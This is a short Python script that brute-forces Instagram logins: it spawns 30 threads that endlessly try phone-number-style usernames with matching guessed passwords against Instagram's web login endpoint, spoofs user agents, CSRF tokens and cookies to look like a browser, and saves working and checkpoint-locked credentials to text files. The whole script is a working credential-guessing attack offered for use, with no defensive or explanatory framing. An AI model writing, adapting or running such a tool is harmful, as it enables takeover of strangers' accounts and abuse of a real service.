import os
os.system('pip install user_agent')
os.system('pip install faker')

import requests,random,secrets,faker,user_agent,threading
good,cp,bad=0,0,0
def login(username,password):
	global good,cp,bad
	headers = {
		'user-agent':str(user_agent.generate_user_agent()),
		'accept-language': 'en-IQ,en;q=0.9,en-US;q=0.8,en;q=0.7',
		'content-type': 'application/x-www-form-urlencoded',
		'x-csrftoken': str(requests.get('https://www.instagram.com/accounts/login/').text.replace("\\", "").split('csrf_token\":\"')[1].split('"')[0]),
		'x-ig-www-claim': '0'
		}

	data = {
		'username': username,
		'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}',
		'etoken': '{}-{}-{}'.format(''.join(random.choice('qwertyuiopasldkhfgzmxnbvcQWERTYUIOPASLDKFHGXMZNBXVC1234567890')for i in range(22)),''.join(random.choice('qwertyuiopasldkhfgzmxnbvcQWERTYUIOPASLDKFHGXMZNBXVC1234567890')for i in range(14)),''.join(random.choice('qwertyuiopasldkhfgzmxnbvcQWERTYUIOPASLDKFHGXMZNBXVC1234567890')for i in range(82)))
		}

	response = requests.post('https://www.instagram.com/api/v1/web/fxcal/auth/login/ajax/',cookies={'mid':secrets.token_hex(8)*2},headers=headers,data=data)
	
	if '{"message":"Error","status":"fail"}' in response.text:
		with open('hit.txt','a') as file:
			file.write(f'{username}:{password}\n')
		good+=1
	elif 'checkpoint_required' in response.text:
		with open('secure.txt','a') as file:
			file.write(f'{username}:{password}\n')
		cp+=1
	else:
		bad+=1
	print(f'</> Good : {good}\n</> Secure : {cp}\n</> Bad : {bad}\n</> Response : {response.text}')
def all():
	while True:
		ak=''.join(random.choice('1234567890')for i in range(7))
		login(f'98912{ak}',f'0912{ak}')
		
for i in range(30):
	threading.Thread(target=all).start()

